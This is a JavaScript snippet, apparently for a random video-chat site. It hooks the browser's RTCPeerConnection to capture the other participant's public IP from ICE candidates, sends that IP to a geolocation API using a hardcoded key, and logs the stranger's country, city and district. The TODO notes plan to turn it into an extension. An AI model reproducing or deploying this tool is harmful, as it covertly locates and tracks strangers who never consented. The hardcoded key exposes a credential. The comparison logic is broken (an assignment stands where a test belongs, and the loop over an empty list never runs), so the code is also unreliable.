const delay = require("delay");

let apiKey = "de46f2adae9d4c8f9d3a70e8621f3fd2";  //https://app.ipgeolocation.io/
const list = [];


function skip() {
  document.getElementsByClassName('disconnectbtn')[0].click();
}


window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
        const output = `
          ---------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          IP: ${json.ip}
          ---------------------
          `;
        for (let i=0; i<list.length; i++){
            if (json.ip = list[i]) {
              skip()
              delay(100)
              skip()
            }
            else{        
              list.push(json.ip)
              console.log(output);
            }
        }
    })
  );
  console.log(list)
};

//TODO:
//code a IP whitelist for IP of people who weren't that bad (searchtab where input = IP)
//create an extension for it
//need graphics 
